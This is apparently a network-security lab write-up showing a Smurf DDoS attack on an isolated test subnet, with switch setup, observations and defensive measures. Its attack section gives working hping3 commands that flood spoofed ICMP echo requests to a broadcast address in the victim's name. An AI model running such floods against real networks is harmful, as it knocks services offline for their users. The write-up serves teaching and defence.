# Smurf Attack Scenario

## Overview
A Smurf attack is a type of Distributed Denial of Service (DDoS) attack that exploits Internet Control Message Protocol (ICMP) by sending spoofed ICMP echo requests to the broadcast address of a network. These requests appear to come from the victim’s IP address, causing all hosts on the network to reply to the victim and overwhelm it with traffic.

## Lab Environment Setup
- **Target (Victim)**: Web-SRV2 (192.168.1.7)  
- **Attacker**: Kali Linux (192.168.1.8)  
- **Network Devices**:  
  - AS1 Switch (192.168.1.254)  
  - Core Switch (192.168.1.253)  
  - EDGE Router (192.168.1.1)  

## Pre-Attack Configuration
1. Configure management IPs on the switches:  

```bash
AS1(config)# interface VLAN 1
AS1(config-if)# ip address 192.168.1.254 255.255.255.0
AS1(config-if)# no shutdown
AS1# debug ip icmp
```

```bash
COR(config)# interface VLAN 1
COR(config-if)# ip address 192.168.1.253 255.255.255.0
COR(config-if)# no shutdown
COR# debug ip icmp
```

2. Start Wireshark on **Web-SRV2** and apply the ICMP filter to observe incoming packets.

## Attack Execution
From the attacker machine (Kali Linux):

```bash
# Launch a Smurf attack by sending ICMP echo requests to the broadcast address
hping3 -1 --flood -a 192.168.1.7 192.168.1.255

# Alternative command with spoofing
hping3 -1 --flood --spoof 192.168.1.7 192.168.1.255
```

- The spoofed source IP (`192.168.1.7`) makes all devices on the subnet reply to Web-SRV2.  
- This generates massive ICMP traffic directed at the victim.  

## Observations
- **Web-SRV2** receives a flood of ICMP echo replies from multiple devices on the network.  
- **Wireshark (on Web-SRV2)** shows a continuous stream of ICMP packets.  
- **AS1 Switch debug** output shows ICMP packets appearing as if they originate from Web-SRV2.  
- **Core Switch debug** confirms the same, reinforcing how spoofing tricks network devices.  

## Analysis
The Smurf attack works by:  
1. Sending spoofed ICMP echo requests to the broadcast address.  
2. Making every host in the subnet send replies to the victim.  
3. Overwhelming the victim with unsolicited traffic, leading to degraded performance or complete denial of service.  

## Defensive Measures
- Disable directed broadcasts on routers (`no ip directed-broadcast`).  
- Implement **ICMP rate-limiting** to control flooding attempts.  
- Deploy **ingress filtering** to block spoofed packets at the edge of the network.  
- Monitor unusual ICMP activity with IDS/IPS solutions.  

## Conclusion
The Smurf attack highlights how attackers can exploit basic networking protocols like ICMP combined with IP spoofing. This scenario demonstrates why modern networks disable broadcast-based ICMP responses by default and enforce stricter security on Layer 3 devices.
